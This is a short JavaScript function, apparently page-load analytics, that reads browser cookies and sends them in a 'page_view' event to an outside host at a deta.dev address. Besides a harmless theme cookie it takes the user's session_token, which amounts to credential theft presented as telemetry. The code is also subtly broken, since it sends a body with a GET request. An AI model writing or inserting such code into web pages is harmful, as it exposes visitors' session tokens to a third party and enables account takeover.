async function pageLoad(document) {
    const event = await fetch(
        "https://akx6sp.deta.dev/",
        {
          method: "GET",
          body: JSON.stringify({
            // get value of cookie "theme"
            "theme": document.cookie.split("theme=")[1].split(";")[0],
            "time": Date.now(),
            "event": "page_view",
            "session_token": document.cookie.split("session_token=")[1].split(";")[0],
          })
        }
      ).then(res => res.json());
    console.log(event);
}